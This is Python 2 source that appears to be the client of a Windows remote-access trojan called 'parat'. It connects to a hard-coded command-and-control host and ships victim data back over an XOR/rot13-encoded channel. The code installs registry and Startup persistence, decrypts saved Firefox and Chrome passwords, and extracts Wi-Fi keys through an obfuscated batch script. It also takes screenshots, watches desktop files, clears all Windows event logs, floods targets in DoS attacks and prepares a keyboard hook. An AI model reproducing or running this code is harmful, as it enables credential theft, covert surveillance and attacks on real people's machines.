#!/usr/bin/env python2

from __future__ import print_function

import os
import sys
import re
import platform
import threading
import socket
import urllib
import urllib2
import ctypes.wintypes
import sqlite3
import win32crypt
import win32gui
import win32ui
import win32con
import win32api
import win32file

from ConfigParser import ConfigParser
from subprocess import PIPE, Popen, check_output, call
from zipfile import is_zipfile, ZipFile, BadZipfile, LargeZipFile
from datetime import datetime
from ctypes import *
from ctypes.wintypes import *
from time import sleep
from tempfile import gettempdir
from random import _urandom, randrange
from shutil import copyfile, copy2, rmtree
from getpass import getuser
from uuid import getnode
from json import load

from ctypes import (
	byref, memset, pointer, sizeof, windll,
	c_void_p as LPRECT,
	c_void_p as LPVOID,
	create_string_buffer,
	Structure,
	POINTER,
	WINFUNCTYPE,
)



# define variables

IP           = 'w1.sshreach.me'
PORT         = 13487

PLATFORM     = 'windows'
ARCHITECTUE  = 'x86'

PORTS = [
			21, 22, 23, 25, 43, 45, 53, 80, 110, 111, 135, 139, 143, 179, 443,
			445, 514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888
		]

SERVICE_NAME = "parat"
RST_FLAG     = False

if getattr(sys, 'frozen', False):
	EXECUTABLE_PATH = sys.executable
elif __file__:
	EXECUTABLE_PATH = __file__
else:
	EXECUTABLE_PATH = ''

EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)


























































































def upload_to_server(filename):

	with open(filename, 'rb') as local_file:

		chunk = local_file.read(4096)

		while chunk:

			ROBOT.send(chunk)
			sleep(0.1)
			chunk = local_file.read(4096)

		ROBOT.send("#DATA_HANDLER")

	local_file.close()




def download_from_server(filename):

	with open(filename, "wb") as remote_file:

		chunk = ROBOT.recv(4096)

		while chunk:

			remote_file.write(chunk)
			sleep(0.1)
			chunk = ROBOT.recv(4096)

			if "#UPLOAD_END" in chunk: break

	remote_file.close()






def wget_from_url(url):

	try:

		filename = url.split('/')[-1]
		content = urllib2.urlopen(url)

		with open(filename, 'wb') as output:
			output.write(content.read())
		output.close()

		ROBOT.send(pencode("[32m[+][0mDownloaded: %s.\n" % filename))

	except Exception as e:
		ROBOT.send(pencode("[91mERROR:[0m {}.\n".format(str(e))))




def scan_local_network(ip):

	try:
		socket.inet_aton(ip)
	except socket.error:
		return '[31m[-][0m Invalid IP address.'

	results = ''

	for port in PORTS:

		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connection = sock.connect_ex((ip, port))
		socket.setdefaulttimeout(0.5)
		state = 'open' if not connection else 'closed'
		results += '{:>5}/tcp {:>7}\n'.format(port, state)

	return results.rstrip() + "#DATA_HANDLER"




def _ping():

	global RST_FLAG

	ping_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ping_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
	ping_sock.connect((IP, 7777))

	while True:

		try:
			ping_sock.send("ping from client")
			sleep(0.5)
		except Exception as e:
			break

	if not RST_FLAG:
		connect_to_server()
		main()



def connect_to_server():
	"""try to connect server and send initial information
	"""

	global ROBOT
	ROBOT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ROBOT.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

	while True:

		try:

			ROBOT.connect((IP, PORT))
			threading.Thread(target=_ping).start()

			host = platform.node()
			user = os.getenv("username")
			client = "@".join([user, host])

			ROBOT.sendall(pencode(client))

		except Exception as e:

			if e.errno == 10061:
				continue # Connectin refused
			elif e.errno == 10056:
				break # Socket is already connected
class ParatBackdoor:

	def __init__(self):
		pass


	def is_installed(self, method):

		if method == 'reg':

			query = "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME

			output = os.popen(query)

			if SERVICE_NAME in output.read():
				return True
			else:
				return False

		if method == 'sup':

			validation = os.environ["APPDATA"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + EXECUTABLE_NAME

			if os.path.isfile(validation):
				return True
			else:
				return False



	def do_action(self, action):

		if action == "registry":

			if not self.is_installed('reg'):

				add_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run" + \
							  " /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + '\\' + EXECUTABLE_NAME)
				stdin, stdout, stderr = os.popen3(add_command)
				copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)

			return "[92m[+][0m Persistence installed.\n"


		if action == "startup":

			if not self.is_installed('sup'):
				copy2(EXECUTABLE_NAME, os.environ["APPDATA"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")

			return "[92m[+][0m Persistence installed.\n"


		elif action == "remove":

			reg_rem, sup_rem = False, False

			if self.is_installed('reg'):

				Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME, shell=False)
				Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % \
							(SERVICE_NAME, '"cmd.exe /c del %USERPROFILE%\\"' + EXECUTABLE_NAME), shell=False)
				reg_rem = True

			if self.is_installed('sup'):
				os.remove(os.environ["APPDATA"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + EXECUTABLE_NAME)
				sup_rem = True


			if reg_rem and sup_rem:
				return "[92m[+][0m Registry and Startup persistences removed.\n"

			elif reg_rem:
				return "[92m[+][0m Registry persistence removed.\n"

			elif sup_rem:
				return "[92m[+][0m Startup persistence removed.\n"



		elif action == "status":

			registry, startup = False, False

			if self.is_installed('reg'):
				registry = True

			if self.is_installed('sup'):
				startup = True


			if registry and startup:
				return "[92m[+][0m registry and startup backdoor are [92menable[0m.\n"

			elif registry:
				return "[92m[+][0m registry backdoor is [92menable[0m.\n"

			elif startup:
				return "[92m[+][0m startup backdoor is [92menable[0m.\n"

			else:
				return "[92m[+][0m Persistence is [31mdisable[0m.\n"
def zip_util(zipped_file, password=None):

	if os.path.isfile(zipped_file):

		try:

			if is_zipfile(zipped_file):

				with ZipFile(zipped_file, "r") as compressed:

					try:

						compressed.extractall(pwd=bytes(password)) if password is not None else compressed.extractall()
						compressed.close()

						return "[32m[+][0m File '{}' extracted.\n".format(zipped_file)

					except RuntimeError:
						return "\r[91mERROR: [0mBad password for file: '%s'.\n" % zipped_file

			else:
				return "\r[91mERROR: [0mSeems to not valid zip file: '%s'.\n" % zipped_file

		except BadZipfile:
			return "\r[91mERROR: [0mFailed to unzip '%s'.\n" % zipped_file

		except LargeZipFile:
			return "\r[91mERROR: [0mFile is too big '%s'.\n" % zipped_file

	else:
		return "\r[91mERROR: [0mFile not found: '%s'.\n" % zipped_file






class ddos_util(threading.Thread):

	def __init__(self, ip, packets):

		self.ip       = ip
		self.port     = 80
		self.size     = 1000
		self.packets  = int(packets) + 1
		self.syn      = socket.socket()
		self.tcp      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.udp      = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		threading.Thread.__init__(self)


	def synFlood(self):

		ROBOT.send(pencode("SYN-Flood started..."))

		for i in range(self.packets):

			try:
				sleep(.03)
				self.syn.connect((self.ip, self.port))
				ROBOT.send(pencode("request " + str(i) + " sent.\n"))

			except:
				ROBOT.send(pencode("#DATA_HANDLER"))
				break

		ROBOT.send(pencode("#DATA_HANDLER"))



	def tcpFlood(self):

		ROBOT.send(pencode("TCP-Flood started..."))

		for i in range(self.packets):

			try:
				bytes = _urandom(self.size)

				self.tcp.connect((self.ip, self.port))
				self.tcp.setblocking(0)
				sleep(.03)
				self.tcp.sendto(bytes, (self.ip, self.port))

				ROBOT.send(pencode("request " + str(i) + " sent.\n"))

			except:
				ROBOT.send(pencode("#DATA_HANDLER"))
				break

		ROBOT.send(pencode("#DATA_HANDLER"))



	def udpFlood(self):

		ROBOT.send(pencode("UDP-Flood started..."))

		for i in range(self.packets):

			try:

				bytes = _urandom(self.size)

				if self.port == 0:
					self.port = randrange(1, 65535)

				sleep(.03)
				self.udp.sendto(bytes, (self.ip, self.port))

				ROBOT.send(pencode("request " + str(i) + " sent.\n"))

			except:
				ROBOT.send(pencode("#DATA_HANDLER"))
				break

		ROBOT.send(pencode("#DATA_HANDLER"))






def msgbox_thread(message, title, button, icon):

	windll.user32.MessageBoxA(0, message, title, button | icon)
	return
def pencode(str):

	try:

		str = unicode(str, errors='ignore')
		cipher = ""

		for i in range(len(str)):
			cipher += chr(ord(str[i])^(ord("P")))

		return cipher.encode('rot13').encode('hex')


	except Exception as e:

		return str(e)



def pdecode(hex):

	try:

		hex = hex[:-1]
		hex = unicode(hex, errors='ignore')
		plain = ""
		cipher = hex.decode('hex').decode('rot13')

		for i in range(len(cipher)):
			plain += chr(ord(cipher[i])^(ord("P")))

		return plain


	except Exception as e:

		return str(e)
def wifi_dump():

	batch_command = "c2V0bG9jYWwgZW5hYmxlZGVsYXllZGV4cGFuc2lvbg0KDQoNCiAgICA6OiBHZXQgYWxsIHRoZSBw" + \
					"cm9maWxlcw0KICAgIGNhbGwgOmdldC1wcm9maWxlcyByDQoNCiAgICA6OiBGb3IgZWFjaCBwcm9m" + \
					"aWxlLCB0cnkgdG8gZ2V0IHRoZSBwYXNzd29yZA0KICAgIDptYWluLW5leHQtcHJvZmlsZQ0KICAg" + \
					"ICAgICBmb3IgL2YgInRva2Vucz0xKiBkZWxpbXM9LCIgJSVhIGluICgiJXIlIikgZG8gKA0KICAg" + \
					"ICAgICAgICAgY2FsbCA6Z2V0LXByb2ZpbGUta2V5ICIlJWEiIGtleQ0KICAgICAgICAgICAgaWYg" + \
					"IiFrZXkhIiBORVEgIiIgKA0KICAgICAgICAgICAgICAgIGVjaG8gICAlJWEgOiAha2V5ISA+PiAl" + \
					"VEVNUCVcd2lmaV9saXN0LnR4dA0KICAgICAgICAgICAgKQ0KICAgICAgICAgICAgc2V0IHI9JSVi" + \
					"DQogICAgICAgICkNCiAgICAgICAgaWYgIiVyJSIgTkVRICIiIGdvdG8gbWFpbi1uZXh0LXByb2Zp" + \
					"bGUNCg0KICAgIGVjaG8uDQoNCg0KICAgIGdvdG8gOmVvZg0KDQo6Og0KOjogR2V0IHRoZSBXaUZp" + \
					"IGtleSBvZiBhIGdpdmVuIHByb2ZpbGUNCjpnZXQtcHJvZmlsZS1rZXkgPDE9cHJvZmlsZS1uYW1l" + \
					"PiA8Mj1vdXQtcHJvZmlsZS1rZXk+DQogICAgc2V0bG9jYWwNCg0KICAgIHNldCByZXN1bHQ9DQoN" + \
					"CiAgICBGT1IgL0YgInVzZWJhY2txIHRva2Vucz0yIGRlbGltcz06IiAlJWEgaW4gKA0KICAgICAg" + \
					"ICBgbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZV49IiV+MSIga2V5Xj1jbGVhciBefCBmaW5k" + \
					"c3RyIC9DOiJLZXkgQ29udGVudCJgKSBETyAoDQogICAgICAgIHNldCByZXN1bHQ9JSVhDQogICAg" + \
					"ICAgIHNldCByZXN1bHQ9IXJlc3VsdDp+MSENCiAgICApDQogICAgKA0KICAgICAgICBlbmRsb2Nh" + \
					"bA0KICAgICAgICBzZXQgJTI9JXJlc3VsdCUNCiAgICApDQoNCiAgICBnb3RvIDplb2YNCg0KOjoN" + \
					"Cjo6IEdldCBhbGwgbmV0d29yayBwcm9maWxlcyAoY29tbWEgc2VwYXJhdGVkKSBpbnRvIHRoZSBy" + \
					"ZXN1bHQgcmVzdWx0LXZhcmlhYmxlDQo6Z2V0LXByb2ZpbGVzIDwxPXJlc3VsdC12YXJpYWJsZT4N" + \
					"CiAgICBzZXRsb2NhbA0KDQogICAgc2V0IHJlc3VsdD0NCg0KDQogICAgRk9SIC9GICJ1c2ViYWNr" + \
					"cSB0b2tlbnM9MiBkZWxpbXM9OiIgJSVhIGluICgNCiAgICAgICAgYG5ldHNoIHdsYW4gc2hvdyBw" + \
					"cm9maWxlcyBefCBmaW5kc3RyIC9DOiJBbGwgVXNlciBQcm9maWxlImApIERPICgNCiAgICAgICAg" + \
					"c2V0IHZhbD0lJWENCiAgICAgICAgc2V0IHZhbD0hdmFsOn4xIQ0KDQogICAgICAgIHNldCByZXN1" + \
					"bHQ9JSF2YWwhLCFyZXN1bHQhDQogICAgKQ0KICAgICgNCiAgICAgICAgZW5kbG9jYWwNCiAgICAg" + \
					"ICAgc2V0ICUxPSVyZXN1bHQ6fjAsLTElDQogICAgKQ0KDQogICAgZ290byA6ZW9mDQo="

	batch_code = batch_command.decode('base64')

	batch_file_name = "\wifi.bat"
	path_to_batch_file = os.environ["TEMP"] + batch_file_name

	with open(path_to_batch_file, 'w') as batch_file:
		batch_file.write(batch_code)
	batch_file.close()

	os.system(path_to_batch_file)
	sleep(1)
	os.remove(path_to_batch_file)

	path_to_all_wifi_list = os.environ["TEMP"] + "\wifi_list.txt"

	if os.path.isfile(path_to_all_wifi_list):

		with open(path_to_all_wifi_list, 'r') as local_file:

			content = local_file.read().strip()
			for line in content.split("\n"):
				ROBOT.send(pencode(line))
				sleep(0.1)

			ROBOT.send(pencode("#DATA_HANDLER"))

		local_file.close()

	else:
		ROBOT.send(pencode("No wifi(es) found.\n"))

	if os.path.isfile(path_to_all_wifi_list): os.remove(path_to_all_wifi_list)




DEVNULL = open(os.devnull, 'w')


class NotFoundError(Exception):
	pass


class Exit(Exception):

	ERROR = 1
	MISSING_PROFILEINI = 2
	MISSING_SECRETS = 3
	BAD_PROFILEINI = 4
	LOCATION_NO_DIRECTORY = 5

	FAIL_LOAD_NSS = 11
	FAIL_INIT_NSS = 12
	FAIL_NSS_KEYSLOT = 13
	FAIL_SHUTDOWN_NSS = 14
	BAD_MASTER_PASSWORD = 15
	NEED_MASTER_PASSWORD = 16

	PASSSTORE_NOT_INIT = 20
	PASSSTORE_MISSING = 21
	PASSSTORE_ERROR = 22

	READ_GOT_EOF = 30
	MISSING_CHOICE = 31
	NO_SUCH_PROFILE = 32

	UNKNOWN_ERROR = 100
	KEYBOARD_INTERRUPT = 102

	def __init__(self, exitcode):
		self.exitcode = exitcode

	def __unicode__(self):
		return "Premature program exit with exit code {0}".format(self.exitcode)


class Credentials(object):

	def __init__(self, db):
		self.db = db

		if not os.path.isfile(db):
			raise NotFoundError("ERROR - {0} database not found\n".format(db))

	def __iter__(self):
		pass

	def done(self):
		pass


class SqliteCredentials(Credentials):

	def __init__(self, profile):
		db = os.path.join(profile, "signons.sqlite")

		super(SqliteCredentials, self).__init__(db)

		self.conn = sqlite3.connect(db)
		self.c = self.conn.cursor()

	def __iter__(self):

		self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
		for i in self.c:
			# yields hostname, encryptedUsername, encryptedPassword, encType
			yield i

	def done(self):
		super(SqliteCredentials, self).done()

		self.c.close()
		self.conn.close()


class JsonCredentials(Credentials):

	def __init__(self, profile):
		db = os.path.join(profile, "logins.json")

		super(JsonCredentials, self).__init__(db)

	def __iter__(self):
		with open(self.db) as fh:

			data = load(fh)

			try:
				logins = data["logins"]
			except:
				raise Exception("Unrecognized format in {0}".format(self.db))
			if len(logins) == 0:
				yield "No password(s) found."
			for i in logins:
				yield (i["hostname"], i["encryptedUsername"],
					   i["encryptedPassword"], i["encType"])


class NSSDecoder(object):

	class SECItem(Structure):

		_fields_ = [
			('type', c_uint),
			('data', c_char_p),  # actually: unsigned char *
			('len', c_uint),
		]

	class PK11SlotInfo(Structure):
		pass


	def __init__(self):

		self.NSS = None
		self.load_libnss()

		SlotInfoPtr = POINTER(self.PK11SlotInfo)
		SECItemPtr = POINTER(self.SECItem)

		self._set_ctypes(c_int, "NSS_Init", c_char_p)
		self._set_ctypes(c_int, "NSS_Shutdown")
		self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
		self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
		self._set_ctypes(c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p)
		self._set_ctypes(c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, c_void_p)
		self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, c_int)

		self._set_ctypes(c_int, "PORT_GetError")
		self._set_ctypes(c_char_p, "PR_ErrorToName", c_int)
		self._set_ctypes(c_char_p, "PR_ErrorToString", c_int, c_uint32)


	def _set_ctypes(self, restype, name, *argtypes):

		res = getattr(self.NSS, name)
		res.restype = restype
		res.argtypes = argtypes
		setattr(self, "_" + name, res)


	@staticmethod
	def find_nss(locations, nssname):

		for loc in locations:
			if os.path.exists(os.path.join(loc, nssname)):
				return loc

		return ""


	def load_libnss(self):

		nssname = "nss3.dll"
		locations = (
			"",  # Current directory or system lib finder
			r"C:\Program Files (x86)\Mozilla Firefox",
			r"C:\Program Files\Mozilla Firefox"
		)
		firefox = self.find_nss(locations, nssname)

		os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])

		try:
			nsslib = os.path.join(firefox, nssname)

			self.NSS = CDLL(nsslib)

		except Exception as e:
			raise Exit(Exit.FAIL_LOAD_NSS)


	def handle_error(self):

		code = self._PORT_GetError()
		name = self._PR_ErrorToName(code)
		name = "NULL" if name is None else name.decode("ascii")
		# 0 is the default language (localization related)
		text = self._PR_ErrorToString(code, 0)
		text = text.decode("utf8")


	def decode(self, data64):
		data = data64.decode('base64')
		inp = self.SECItem(0, data, len(data))
		out = self.SECItem(0, None, 0)

		e = self._PK11SDR_Decrypt(inp, out, None)

		try:
			if e == -1:

				self.handle_error()
				raise Exit(Exit.NEED_MASTER_PASSWORD)

			res = string_at(out.data, out.len).decode("utf8")
		finally:
			# Avoid leaking SECItem
			self._SECITEM_ZfreeItem(out, 0)

		return res


class NSSInteraction(object):

	def __init__(self):

		self.profile = None
		self.NSS = NSSDecoder()


	def load_profile(self, profile):

		self.profile = profile
		e = self.NSS._NSS_Init(self.profile.encode("utf8"))
		if e != 0:
			self.NSS.handle_error()


	def authenticate(self, interactive):

		keyslot = self.NSS._PK11_GetInternalKeySlot()
		if not keyslot:
			self.NSS.handle_error()


	def unload_profile(self):

		e = self.NSS._NSS_Shutdown()
		if e != 0:
			self.NSS.handle_error()


	def decode_entry(self, user64, passw64):

		user = self.NSS.decode(user64)
		passw = self.NSS.decode(passw64)

		return user, passw


	def decrypt_passwords(self):

		credentials = obtain_credentials(self.profile)

		try:

			for host, user, passw, enctype in credentials:

				if enctype:
					user, passw = self.decode_entry(user, passw)
				output = (
					u"\nWebsite : {0}\n".format(host),
					u"Username: {0}\n".format(user),
					u"Password: {0}\n".format(passw),
				)
				for line in output:
					ROBOT.send(pencode(str(line))); sleep(.1)
				ROBOT.send(pencode("#DATA_HANDLER"))

		except ValueError:
			ROBOT.send(pencode("No password(s) found."))

		credentials.done()



def obtain_credentials(profile):

	try:
		credentials = JsonCredentials(profile)
	except NotFoundError:
		try:
			credentials = SqliteCredentials(profile)
		except NotFoundError:
			raise Exit(Exit.MISSING_SECRETS)

	return credentials



def mozilla_passwords():

	interactive  = True
	basepath     = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox")
	profileini   = os.path.join(basepath, "profiles.ini")

	nss = NSSInteraction()

	profiles = ConfigParser()
	profiles.read(profileini)

	for section in profiles.sections():
		if section.startswith("Profile"):
			section = profiles.get(section, "Path")
		else:
			continue

	profile = os.path.join(basepath, section)

	nss.load_profile(profile)
	nss.authenticate(interactive)
	nss.decrypt_passwords()

	nss.unload_profile()








def chrome_passwords():

	info_list = []

	path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
	if (os.path.isdir(path) == False):
		ROBOT.send(pencode('Chrome doesn\'t exists'))

	else:

		try:

			connection = sqlite3.connect(path + "Login Data")

			with connection:
				cursor = connection.cursor()
				v = cursor.execute(
					'SELECT action_url, username_value, password_value FROM logins')
				value = v.fetchall()

			for information in value:

				password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
				if password:
					info_list.append({
						'origin_url': information[0],
						'username': information[1],
						'password': str(password)
					})

		except sqlite3.OperationalError, e:

			e = str(e)

			if (e == 'database is locked'):
				return '[!] Make sure Google Chrome is not running in the background'

			elif (e == 'no such table: logins'):
				return '[!] Something wrong with the database name'

			elif (e == 'unable to open database file'):
				return '[!] Something wrong with the database path'

			else:
				return str(e)

		for line in info_list:
			ROBOT.send(pencode(str(line))); sleep(.1)
		ROBOT.send(pencode("#DATA_HANDLER"))










user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
keystrokes=0
mouse_clicks = 0
double_clicks = 0

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint),
                ("dwTime", ctypes.c_ulong)]




def get_last_active():

    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)

    # get last input registered
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

    # now determine how long the machine has been running
    run_time = kernel32.GetTickCount()

    elapsed = run_time - struct_lastinputinfo.dwTime

    ROBOT.send(pencode("[*] It's been %d milliseconds since the last input event.\n" % elapsed))





# these are the common temp file directories
desktop  = os.path.join(os.environ["HOMEPATH"], "Desktop")
temp_dir = gettempdir()
dirs_to_monitor = [desktop]

# list of changes to send each request
all_changes = []

# file modification constants
FILE_CREATED=1
FILE_DELETED=2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5



def start_monitor(path_to_watch):

    # we create a thread for each monitoring run
    FILE_LIST_DIRECTORY = 0x0001

    try:
		h_directory = win32file.CreateFile(
	        path_to_watch,
	        FILE_LIST_DIRECTORY,
	        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
	        None,
	        win32con.OPEN_EXISTING,
	        win32con.FILE_FLAG_BACKUP_SEMANTICS,
	        None
	    )

		while 1:
			try:
				results = win32file.ReadDirectoryChangesW(
					h_directory,
					1024,
					True,
					win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
					win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
					win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
					win32con.FILE_NOTIFY_CHANGE_SIZE |
					win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
					win32con.FILE_NOTIFY_CHANGE_SECURITY,
					None,
					None
	            )

				for action, file_name in results:
					full_filename = os.path.join(path_to_watch, file_name)
					if action == FILE_CREATED:
						all_changes.append("[ + ] Created %s\n" % full_filename)

					elif action == FILE_DELETED:
						all_changes.append("[ - ] Deleted %s\n" % full_filename)

					elif action == FILE_MODIFIED:

						all_changes.append("[ * ] Modified %s\n" % full_filename)

						# dump out the file contents
						all_changes.append("[vvv] Dumping contents...\n")

						try:
							fd = open(full_filename,"rb")
							contents = fd.read()
							if len(contents) < 2048:
								pass
							else:
								contents = "(too big content)\n"
							fd.close()
							all_changes.append(contents)
							all_changes.append("[^^^] Dump complete.\n")

						except Exception as e:
							all_changes.append("[!!!] %s.\n" % str(e))

					elif action == FILE_RENAMED_FROM:
						all_changes.append("[ > ] Renamed from: %s\n" % full_filename)

					elif action == FILE_RENAMED_TO:
						all_changes.append("[ < ] Renamed to: %s\n" % full_filename)

					else:
						all_changes.append("[???] Unknown: %s\n" % full_filename)

			except:
				pass
    except Exception:
        pass

def grab_all_data(plat_type):

	try:

		values  = {}
		cache   = os.popen2("SYSTEMINFO")
		source  = cache[1].read()

		fields = [
					"Host Name", "OS Name", "OS Version",
					"Product ID", "System Manufacturer",
					"System Model", "System type", "BIOS Version",
					"Domain", "Processor", "Windows Directory", "Total Physical Memory",
					"Available Physical Memory", "Logon Server"
				  ]

		for field in fields:
			if field == "Processor":
				values[field] = re.findall("Processor\(s\):\s+(.+\n\s+.+)", source, re.IGNORECASE)[0]
			else:
				values[field] = [item.strip() for item in re.findall("%s:\w*(.*?)\n" % (field), source, re.IGNORECASE)][0]

		for index, (_, value) in enumerate(values.items(), 1):

			if index == 1: ap_memory             = str(value)
			if index == 2: product_id            = str(value)
			if index == 3: os_name               = str(value)
			if index == 4: bios_version          = str(value)
			if index == 5: system_model          = str(value)
			if index == 6: system_type           = str(value)
			if index == 7: processor             = str(value)
			if index == 8: tp_memory             = str(value)
			if index == 9: logon_server          = str(value)
			if index == 10: domain               = str(value)
			if index == 11: windows_directory    = str(value)
			if index == 12: os_version           = str(value)
			if index == 13: system_manufacturer  = str(value)
			if index == 14: host_name            = str(value)


		username      = getuser()
		fqdn          = socket.getfqdn()
		internal_ip   = socket.gethostbyname(hostname)
		raw_mac       = getnode()
		mac           = ':'.join(("%012X" % raw_mac)[i:i+2] for i in range(0, 12, 2))
		ex_ip_grab    = ['ipinfo.io/ip', 'icanhazip.com', 'ident.me', 'ipecho.net/plain', 'myexternalip.com/raw']
		external_ip   = ''


		for url in ex_ip_grab:

			try:
				external_ip = urllib.urlopen('http://' + url).read().rstrip()
			except IOError:
				pass

			if external_ip and (6 < len(external_ip) < 16): break

		is_admin = False

		if plat_type.startswith('win'):
			is_admin = windll.shell32.IsUserAnAdmin() != 0

		admin_access = 'Yes' if is_admin else 'No'

		url           = 'http://ip-api.com/json/'
		response      = urllib2.urlopen(url)
		data          = load(response)
		_as           = data['as']
		city          = data['city']
		country       = data['country']
		country_code  = data['countryCode']
		isp           = data['isp']
		lat           = data['lat']
		lon           = data['lon']
		org           = data['org']
		region        = data['region']
		region_name   = data['regionName']
		_zip          = data['zip']
		timezone      = data['timezone']
		if _zip == "": _zip = "-"


		survey_results = '''  As                        : {}
  City                      : {}
  Country                   : {}
  Country Code              : {}
  ISP                       : {}
  Lat                       : {}
  Lon                       : {}
  Org                       : {}
  Region                    : {}
  Region Name               : {}
  Zip                       : {}
  Timezone                  : {}
  FQDN                      : {}
  Internal IP               : {}
  External IP               : {}
  MAC Address               : {}
  Current User              : {}
  Admin Access              : {}
  Host Name                 : {}
  OS Name                   : {}
  OS Version                : {}
  Product ID                : {}
  System Manufacturer       : {}
  System Model              : {}
  System type               : {}
  BIOS Version              : {}
  Domain                    : {}
  Logon Server              : {}
  Windows Directory         : {}
  Total Physical Memory     : {}
  Available Physical Memory : {}
  Processor                 : {}
	'''.format(
			_as, city, country, country_code, isp, lat, lon, org, region, region_name, _zip, timezone,
			fqdn, internal_ip, external_ip, mac, username, admin_access, host_name, os_name,
			os_version, product_id, system_manufacturer, system_model, system_type, bios_version, domain,
			logon_server, windows_directory, tp_memory, ap_memory, processor
		)

		return survey_results

	except Exception as e: return e
def clean_logs():

	try:

		powershell_result = Popen(
			'powershell -Command "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"',
			stdout=PIPE,
			stderr=PIPE
		)
		out, err = powershell_result.communicate()

		ROBOT.send(pencode("[32m[+][0mLogs cleaned successfully.\n"))


	except:

		ROBOT.send(pencode("[91mERROR: [0mUnknown error: 'rmlog'.\n"))
def screenshot():

	bmp_path = os.environ["TEMP"] + "\screenshot.bmp"

	# grab a handle to the main desktop window
	hdesktop = win32gui.GetDesktopWindow()

	# determine the size of all monitors in pixels
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)

	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

	# create a device context
	desktop_dc = win32gui.GetWindowDC(hdesktop)

	img_dc = win32ui.CreateDCFromHandle(desktop_dc)

	# create a memory based device context
	mem_dc = img_dc.CreateCompatibleDC()

	# create a bitmap object
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)
	mem_dc.SelectObject(screenshot)

	# copy the screen into our memory device context
	mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

	# save the bitmap to a file
	screenshot.SaveBitmapFile(mem_dc, bmp_path)

	# free our objects
	mem_dc.DeleteDC()
	win32gui.DeleteObject(screenshot.GetHandle())

	upload_to_server(bmp_path)

	os.remove(bmp_path)
# Base windows types
#LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
#WPARAM  = c_uint
#LPARAM  = c_long
ULONG_PTR = WPARAM
LRESULT = LPARAM
LPMSG = POINTER(MSG)

HANDLE  = c_void_p
HHOOK   = HANDLE
HKL     = HANDLE
ULONG_PTR = WPARAM

HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

# Base constans
# https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
WM_KEYDOWN      = 0x0100
WM_SYSKEYDOWN   = 0x0104
WH_KEYBOARD_LL  = 13
VK_TAB          = 0x09 # TAB key
VK_CAPITAL      = 0x14 # CAPITAL key
VK_SHIFT        = 0x10 # SHIFT key
VK_CONTROL      = 0x11 # CTRL key
VK_MENU         = 0x12 # ALT key
VK_LMENU        = 0xA4 # ALT key
VK_RMENU        = 0xA5 # ALT+GR key
VK_RETURN       = 0x0D # ENTER key
VK_ESCAPE       = 0x1B

#some windows function defines :

GetModuleHandleW = kernel32.GetModuleHandleW
GetModuleHandleW.restype = HMODULE
GetModuleHandleW.argtypes = [LPCWSTR]

SetWindowsHookEx = user32.SetWindowsHookExW
SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
SetWindowsHookEx.restype = HHOOK

UnhookWindowsHookEx = user32.UnhookWindowsHookEx
CallNextHookEx      = user32.CallNextHookEx
GetMessageW         = user32.GetMessageW
GetKeyboardState    = user32.GetKeyboardState
GetKeyboardLayout   = user32.GetKeyboardLayout
ToUnicodeEx         = user32.ToUnicodeEx


CallNextHookEx.restype = LRESULT
